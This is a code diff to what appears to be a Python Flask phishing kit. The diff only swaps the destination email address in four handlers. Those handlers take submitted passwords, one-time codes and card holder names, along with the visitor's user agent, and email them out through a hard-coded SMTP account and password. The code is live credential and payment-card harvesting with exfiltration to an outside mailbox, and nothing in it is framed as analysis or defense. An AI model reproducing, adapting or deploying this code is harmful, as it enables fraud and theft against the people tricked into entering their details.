@@ -147,7 +147,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = "yosiel.gurfateh@moongit.com"
+        receiver_email = "trison.othniel@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -184,7 +184,7 @@ def second():
         email = request.form.get("otp")
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = "yosiel.gurfateh@moongit.com"
+        receiver_email = "trison.othniel@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -227,7 +227,7 @@ def third():
         cardholder = request.form.get("cardHolderName")
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = "yosiel.gurfateh@moongit.com"
+        receiver_email = "trison.othniel@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -263,7 +263,7 @@ def fourth():
         email = request.form.get("otp")
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = "yosiel.gurfateh@moongit.com"
+        receiver_email = "trison.othniel@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
